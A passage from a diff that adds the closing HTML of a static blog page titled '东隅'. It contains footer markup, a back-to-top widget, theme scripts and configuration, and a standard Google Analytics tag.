+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
